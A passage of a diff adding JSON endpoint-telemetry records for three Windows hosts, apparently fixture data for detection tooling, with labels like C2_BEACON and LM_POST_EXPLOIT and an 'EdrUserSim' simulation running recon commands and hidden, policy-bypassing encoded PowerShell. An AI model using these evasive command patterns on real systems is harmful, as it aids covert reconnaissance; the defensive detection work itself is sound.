+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:33:01.620215Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 46460,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:34:01.555799Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 39308,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:35:01.491088Z"
+                }
+              ],
+              "authentication_activities": [
+                {
+                  "session_id": "{8DDE3387-737C-6AA2-7323-020000000000}",
+                  "source_ip": "172.16.2.99",
+                  "event_type": "SUSPICIOUS_RECON_CMD",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-18T04:18:22.191790Z",
+                    "2026-09-18T04:31:47.848770Z"
+                  ]
+                },
+                {
+                  "session_id": "{8DDE3387-737C-6AA2-7323-020000000000}",
+                  "source_ip": "172.16.2.99",
+                  "event_type": "LM_POST_EXPLOIT",
+                  "observed_at": "2026-09-18T04:18:35.077142Z"
+                },
+                {
+                  "session_id": "{8DDE3387-737C-6AA2-7323-020000000000}",
+                  "source_ip": "172.16.2.99",
+                  "event_type": "HIGH_FREQ_PROCESS_SPAWN",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-18T04:25:11.250314Z",
+                    "2026-09-18T04:29:06.587342Z"
+                  ]
+                },
+                {
+                  "session_id": "{8DDE3387-737C-6AA2-7323-020000000000}",
+                  "source_ip": "172.16.2.99",
+                  "event_type": "C2_BEACON",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-18T04:26:31.075187Z",
+                    "2026-09-18T04:27:05.036387Z"
+                  ]
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "entity_ref": "E2",
+          "entity_display": "DESKTOP-U8GL6JB（172.16.2.109，资产ID 3617506）",
+          "activity_segments": [
+            {
+              "segment_id": "E2-SEG-001",
+              "scope": "anchor_entity",
+              "time_range": [
+                "2026-09-15T07:16:01.878000Z",
+                "2026-09-18T08:48:40.057000Z"
+              ],
+              "source_types": [
+                "Wazuh",
+                "detect"
+              ],
+              "processes": [
+                {
+                  "ref": "P001",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "user": "DESKTOP-U8GL6JB\\\\wish-win10",
+                  "observed_at": "2026-09-15T07:16:01.878000Z"
+                },
+                {
+                  "ref": "P002",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "count": 7,
+                  "time_range": [
+                    "2026-09-15T22:55:36.929000Z",
+                    "2026-09-17T22:55:46.037000Z"
+                  ],
+                  "cmdline": "powershell secedit /export /cfg $env:TEMP\\\\secpol.cfg; Get-Content $env:TEMP\\\\secpol.cfg | Select-String \\\"PasswordHistorySize\\\"; Remove-Item $env:TEMP\\\\secpol.cfg"
+                },
+                {
+                  "ref": "P003",
+                  "image": "C:\\\\Program Files\\\\Windows Defender\\\\MpCmdRun.exe",
+                  "user": "NT AUTHORITY\\\\NETWORK SERVICE",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-16T09:00:51.090000Z",
+                    "2026-09-17T09:00:51.317000Z"
+                  ]
+                },
+                {
+                  "ref": "P004",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "powershell secedit /export /cfg $env:TEMP\\\\secpol.cfg; Get-Content $env:TEMP\\\\secpol.cfg | Select-String \\\"PasswordHistorySize\\\"; Remove-Item $env:TEMP\\\\secpol.cfg"
+                },
+                {
+                  "ref": "P005",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\SecEdit.exe",
+                  "cmdline": "\\\"C:\\\\Windows\\\\system32\\\\SecEdit.exe\\\" /export /cfg C:\\\\Windows\\\\TEMP\\\\secpol.cfg",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "observed_at": "2026-09-16T10:55:38.085000Z",
+                  "parent_ref": "P004"
+                },
+                {
+                  "ref": "P006",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "powershell secedit /export /cfg $env:TEMP\\\\secpol.cfg; Get-Content $env:TEMP\\\\secpol.cfg | Select-String \\\"PasswordHistorySize\\\"; Remove-Item $env:TEMP\\\\secpol.cfg"
+                },
+                {
+                  "ref": "P007",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\SecEdit.exe",
+                  "cmdline": "\\\"C:\\\\Windows\\\\system32\\\\SecEdit.exe\\\" /export /cfg C:\\\\Windows\\\\TEMP\\\\secpol.cfg",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "observed_at": "2026-09-17T10:55:37.814066Z",
+                  "parent_ref": "P006"
+                },
+                {
+                  "ref": "P008",
+                  "image": "C:\\\\Program Files (x86)\\\\ossec-agent\\\\wazuh-agent.exe",
+                  "cmdline": "\\\"C:\\\\Program Files (x86)\\\\ossec-agent\\\\wazuh-agent.exe\\\""
+                },
+                {
+                  "ref": "P009",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\net.exe",
+                  "cmdline": "net user",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-17T10:55:52.987929Z",
+                    "2026-09-17T22:55:53.068034Z"
+                  ],
+                  "parent_ref": "P008"
+                },
+                {
+                  "ref": "P010",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\auditpol.exe",
+                  "cmdline": "auditpol.exe /get /subcategory:\\\"Account Lockout\\\"",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "observed_at": "2026-09-17T10:55:53.687976Z",
+                  "parent_ref": "P008"
+                },
+                {
+                  "ref": "P011",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\SecEdit.exe",
+                  "cmdline": "\\\"C:\\\\Windows\\\\system32\\\\SecEdit.exe\\\" /export /cfg C:\\\\Windows\\\\TEMP\\\\secpol.cfg",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "observed_at": "2026-09-17T22:55:37.938000Z",
+                  "parent_ref": "P002"
+                },
+                {
+                  "ref": "P012",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "powershell secedit /export /cfg $env:TEMP\\\\secpol.cfg; Get-Content $env:TEMP\\\\secpol.cfg | Select-String \\\"MaximumPasswordAge\\\"; Remove-Item $env:TEMP\\\\secpol.cfg"
+                },
+                {
+                  "ref": "P013",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\SecEdit.exe",
+                  "cmdline": "\\\"C:\\\\Windows\\\\system32\\\\SecEdit.exe\\\" /export /cfg C:\\\\Windows\\\\TEMP\\\\secpol.cfg",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "observed_at": "2026-09-17T22:55:39.972000Z",
+                  "parent_ref": "P012"
+                },
+                {
+                  "ref": "P014",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "powershell secedit /export /cfg $env:TEMP\\\\secpol.cfg; Get-Content $env:TEMP\\\\secpol.cfg | Select-String \\\"ResetLockoutCount\\\"; Remove-Item $env:TEMP\\\\secpol.cfg"
+                },
+                {
+                  "ref": "P015",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\SecEdit.exe",
+                  "cmdline": "\\\"C:\\\\Windows\\\\system32\\\\SecEdit.exe\\\" /export /cfg C:\\\\Windows\\\\TEMP\\\\secpol.cfg",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "observed_at": "2026-09-17T22:55:51.871000Z",
+                  "parent_ref": "P014"
+                },
+                {
+                  "ref": "P016",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\auditpol.exe",
+                  "cmdline": "auditpol.exe /get /subcategory:\\\"Security Group Management\\\"",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "observed_at": "2026-09-17T22:55:53.454372Z",
+                  "parent_ref": "P008"
+                },
+                {
+                  "ref": "P017",
+                  "image": "C:\\\\Program Files\\\\Windows Defender\\\\MsMpEng.exe",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "count": 8,
+                  "time_range": [
+                    "2026-09-18T08:48:39.714000Z",
+                    "2026-09-18T08:48:39.844000Z"
+                  ]
+                },
+                {
+                  "ref": "P018",
+                  "image": "C:\\\\Windows\\\\system32\\\\taskhostw.exe",
+                  "user": "DESKTOP-U8GL6JB\\\\wish-win10",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-18T08:48:39.954000Z",
+                    "2026-09-18T08:48:40.057000Z"
+                  ]
+                }
+              ],
+              "file_operations": [
+                {
+                  "path": "C:\\\\Users\\\\wish-win10\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_ljmu2fro.vlc.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T07:16:01.878000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_elak0low.cbe.ps1",
+                  "operation": "OTHER",
+                  "process_image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T22:55:36.929000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\SERVIC~1\\\\NETWOR~1\\\\AppData\\\\Local\\\\Temp\\\\mpam-7b44b9ff.exe",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P003",
+                  "observed_at": "2026-09-16T09:00:51.090000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_oxpqlgws.z0r.ps1",
+                  "operation": "OTHER",
+                  "process_ref": "P002",
+                  "observed_at": "2026-09-16T22:55:36.308000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\SERVIC~1\\\\NETWOR~1\\\\AppData\\\\Local\\\\Temp\\\\mpam-1581627c.exe",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P003",
+                  "observed_at": "2026-09-17T09:00:51.317000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_5fesjiv2.g4i.ps1",
+                  "operation": "OTHER",
+                  "process_ref": "P006",
+                  "observed_at": "2026-09-17T10:55:37.142000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_3tfuzuu2.vr3.ps1",
+                  "operation": "OTHER",
+                  "process_ref": "P002",
+                  "observed_at": "2026-09-17T22:55:37.321000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_qgm1a1c4.y3s.ps1",
+                  "operation": "OTHER",
+                  "process_ref": "P002",
+                  "observed_at": "2026-09-17T22:55:41.056000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_zxhcl3gf.og4.ps1",
+                  "operation": "OTHER",
+                  "process_image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-17T22:55:42.691000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_1nfn0qku.mde.ps1",
+                  "operation": "OTHER",
+                  "process_image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-17T22:55:46.037000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\C334EA0C-2367-41DC-8920-CB3174153EDB\\\\AssocProvider.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-18T08:48:39.714000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\C334EA0C-2367-41DC-8920-CB3174153EDB\\\\DismCorePS.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-18T08:48:39.724000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\C334EA0C-2367-41DC-8920-CB3174153EDB\\\\LogProvider.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-18T08:48:39.753000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\C334EA0C-2367-41DC-8920-CB3174153EDB\\\\OSProvider.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-18T08:48:39.755000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\C334EA0C-2367-41DC-8920-CB3174153EDB\\\\ProvProvider.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-18T08:48:39.763000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\C334EA0C-2367-41DC-8920-CB3174153EDB\\\\SmiProvider.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-18T08:48:39.765000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\C334EA0C-2367-41DC-8920-CB3174153EDB\\\\SysprepProvider.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-18T08:48:39.765000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\C334EA0C-2367-41DC-8920-CB3174153EDB\\\\UnattendProvider.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-18T08:48:39.844000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\SDIAG_9fedb700-92b4-4ab4-b3e9-e3ffa5fb2b59\\\\DiagPackage.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P018",
+                  "observed_at": "2026-09-18T08:48:39.954000Z"
+                },
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\SDIAG_9fedb700-92b4-4ab4-b3e9-e3ffa5fb2b59\\\\RS_SyncSystemTime.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P018",
+                  "observed_at": "2026-09-18T08:48:40.057000Z"
+                }
+              ],
+              "network_details": [
+                {
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T07:16:01.878000Z"
+                },
+                {
+                  "process_image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "count": 7,
+                  "time_range": [
+                    "2026-09-15T22:55:36.929000Z",
+                    "2026-09-17T22:55:46.037000Z"
+                  ]
+                },
+                {
+                  "process_ref": "P003",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-16T09:00:51.090000Z",
+                    "2026-09-17T09:00:51.317000Z"
+                  ]
+                },
+                {
+                  "process_ref": "P005",
+                  "count": 6,
+                  "time_range": [
+                    "2026-09-16T10:55:38.085000Z",
+                    "2026-09-17T22:55:51.871000Z"
+                  ]
+                },
+                {
+                  "process_ref": "P009",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-17T10:55:52.987929Z",
+                    "2026-09-17T22:55:53.068034Z"
+                  ]
+                },
+                {
+                  "process_ref": "P010",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-17T10:55:53.687976Z",
+                    "2026-09-17T22:55:53.454372Z"
+                  ]
+                },
+                {
+                  "observed_at": "2026-09-17T22:55:01.928000Z"
+                },
+                {
+                  "process_ref": "P017",
+                  "count": 8,
+                  "time_range": [
+                    "2026-09-18T08:48:39.714000Z",
+                    "2026-09-18T08:48:39.844000Z"
+                  ]
+                },
+                {
+                  "process_ref": "P018",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-18T08:48:39.954000Z",
+                    "2026-09-18T08:48:40.057000Z"
+                  ]
+                }
+              ],
+              "authentication_activities": [
+                {
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "session_id": "{b23bd11f-4fbc-6aa3-e703-000000000000}",
+                  "source_ip": "172.16.2.109",
+                  "event_type": "OTHER",
+                  "count": 4,
+                  "time_range": [
+                    "2026-09-16T10:55:38.085000Z",
+                    "2026-09-17T22:55:51.871000Z"
+                  ]
+                },
+                {
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "session_id": "{b23bd11f-4fbc-6aa3-e703-000000000000}",
+                  "source_ip": "172.16.2.109",
+                  "event_type": "SUSPICIOUS_RECON_CMD",
+                  "count": 4,
+                  "time_range": [
+                    "2026-09-17T10:55:37.814066Z",
+                    "2026-09-17T22:55:53.068034Z"
+                  ]
+                },
+                {
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "session_id": "{b23bd11f-4fbc-6aa3-e703-000000000000}",
+                  "source_ip": "172.16.2.109",
+                  "event_type": "HIGH_FREQ_PROCESS_SPAWN",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-17T10:55:53.687976Z",
+                    "2026-09-17T22:55:53.454372Z"
+                  ]
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "entity_ref": "E3",
+          "entity_display": "DESKTOP-C82PUMN（172.16.2.110，资产ID 3617507）",
+          "activity_segments": [
+            {
+              "segment_id": "E3-SEG-001",
+              "scope": "anchor_entity",
+              "time_range": [
+                "2026-09-14T20:15:51.631000Z",
+                "2026-09-15T00:59:23.700000Z"
+              ],
+              "source_types": [
+                "Wazuh",
+                "detect"
+              ],
+              "processes": [
+                {
+                  "ref": "P001",
+                  "image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "user": "NT AUTHORITY\\\\SYSTEM",
+                  "observed_at": "2026-09-14T20:15:51.631000Z"
+                },
+                {
+                  "ref": "P002",
+                  "image": "C:\\\\Windows\\\\Explorer.EXE",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "count": 3,
+                  "time_range": [
+                    "2026-09-14T23:53:55.918000Z",
+                    "2026-09-15T00:55:20.552000Z"
+                  ]
+                },
+                {
+                  "ref": "P003",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \\\"C:\\\\Users\\\\wish-wish10-pc\\\\Desktop\\\\Invoke-EdrUserSim.ps1\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "count": 29,
+                  "time_range": [
+                    "2026-09-14T23:54:47.641000Z",
+                    "2026-09-15T00:59:23.700000Z"
+                  ]
+                },
+                {
+                  "ref": "P004",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "\\\"cmd.exe\\\" /c \\\"(whoami /all) &gt; \\\"\\\"C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\out-1d9206ba3733477c967c00720b72d1f7.txt\\\"\\\" 2&gt;&amp;1\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-14T23:54:01.589573Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P005",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "\\\"cmd.exe\\\" /c \\\"(ipconfig /all) &gt; \\\"\\\"C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\out-3403638a2066410295783f14869033af.txt\\\"\\\" 2&gt;&amp;1\\\""
+                },
+                {
+                  "ref": "P006",
+                  "image": "C:\\\\Windows\\\\System32\\\\ipconfig.exe",
+                  "cmdline": "ipconfig  /all",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-14T23:54:03.804822Z",
+                  "parent_ref": "P005"
+                },
+                {
+                  "ref": "P007",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "\\\"powershell.exe\\\" -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand RwBlAHQALQBEAGEAdABlACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARgBpAGwAZQBQAGEAdABoACAAJwBDADoAXABVAHMAZQByAHMAXABXAEkAUwBIAC0AVwB+ADEAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAEUAZAByAFUAcwBlAHIAUwBpAG0AXABlAG4AYwBvAGQAZQBkAC0AbwBrAC4AdAB4AHQAJwAgAC0ARQBuAGMAbwBkAGkAbgBnACAAdQB0AGYAOAA=",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-14T23:54:49.775000Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P008",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "\\\"powershell.exe\\\" -NoProfile -NonInteractive -WindowStyle Hidden -Command \\\"Get-Date | Out-File -FilePath 'C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\hidden-ok.txt' -Encoding utf8\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-14T23:54:52.205000Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P009",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "\\\"cmd.exe\\\" /c \\\"(whoami /all) &gt; \\\"\\\"C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\out-0c27b0964c4e428a85012b1b93d04e41.txt\\\"\\\" 2&gt;&amp;1\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:05:39.236535Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P010",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "\\\"powershell.exe\\\" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"Get-Date | Out-File -FilePath 'C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\hotfix-scan.log' -Encoding utf8\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:06:19.843000Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P011",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "\\\"powershell.exe\\\" -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand RwBlAHQALQBEAGEAdABlACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARgBpAGwAZQBQAGEAdABoACAAJwBDADoAXABVAHMAZQByAHMAXABXAEkAUwBIAC0AVwB+ADEAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAEUAZAByAFUAcwBlAHIAUwBpAG0AXABlAG4AYwBvAGQAZQBkAC0AbwBrAC4AdAB4AHQAJwAgAC0ARQBuAGMAbwBkAGkAbgBnACAAdQB0AGYAOAA=",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:06:22.369000Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P012",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "\\\"powershell.exe\\\" -NoProfile -NonInteractive -WindowStyle Hidden -Command \\\"Get-Date | Out-File -FilePath 'C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\hidden-ok.txt' -Encoding utf8\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:06:24.818000Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P013",
+                  "image": "C:\\\\Windows\\\\System32\\\\taskkill.exe",
+                  "cmdline": "\\\"taskkill.exe\\\" /PID 3920 /T /F",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:07:00.040815Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P014",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "C:\\\\Windows\\\\system32\\\\cmd.exe /c \\\"\\\"C:\\\\Users\\\\wish-wish10-pc\\\\Desktop\\\\Run-EdrUserSim.cmd\\\" \\\""
+                },
+                {
+                  "ref": "P015",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \\\"C:\\\\Users\\\\wish-wish10-pc\\\\Desktop\\\\Invoke-EdrUserSim.ps1\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:45:27.567000Z",
+                  "parent_ref": "P014"
+                },
+                {
+                  "ref": "P016",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "\\\"cmd.exe\\\" /c \\\"(net user) &gt; \\\"\\\"C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\out-b4cf364c72b148a79844821de77f54ef.txt\\\"\\\" 2&gt;&amp;1\\\""
+                },
+                {
+                  "ref": "P017",
+                  "image": "C:\\\\Windows\\\\System32\\\\net.exe",
+                  "cmdline": "net  user",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:45:32.662959Z",
+                  "parent_ref": "P016"
+                },
+                {
+                  "ref": "P018",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "\\\"powershell.exe\\\" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"Get-Date | Out-File -FilePath 'C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\hotfix-scan.log' -Encoding utf8\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:46:09.438000Z",
+                  "parent_ref": "P015"
+                },
+                {
+                  "ref": "P019",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "\\\"powershell.exe\\\" -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand RwBlAHQALQBEAGEAdABlACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARgBpAGwAZQBQAGEAdABoACAAJwBDADoAXABVAHMAZQByAHMAXABXAEkAUwBIAC0AVwB+ADEAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAEUAZAByAFUAcwBlAHIAUwBpAG0AXABlAG4AYwBvAGQAZQBkAC0AbwBrAC4AdAB4AHQAJwAgAC0ARQBuAGMAbwBkAGkAbgBnACAAdQB0AGYAOAA=",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:46:11.993097Z",
+                  "parent_ref": "P015"
+                },
+                {
+                  "ref": "P020",
+                  "image": "C:\\\\Windows\\\\System32\\\\taskkill.exe",
+                  "cmdline": "\\\"taskkill.exe\\\" /PID 2412 /T /F",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:46:49.654076Z",
+                  "parent_ref": "P015"
+                },
+                {
+                  "ref": "P021",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "C:\\\\Windows\\\\system32\\\\cmd.exe /c \\\"\\\"C:\\\\Users\\\\wish-wish10-pc\\\\Desktop\\\\Run-EdrUserSim.cmd\\\" \\\""
+                },
+                {
+                  "ref": "P022",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "cmdline": "powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \\\"C:\\\\Users\\\\wish-wish10-pc\\\\Desktop\\\\Invoke-EdrUserSim.ps1\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:55:22.873000Z",
+                  "parent_ref": "P021"
+                },
+                {
+                  "ref": "P023",
+                  "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
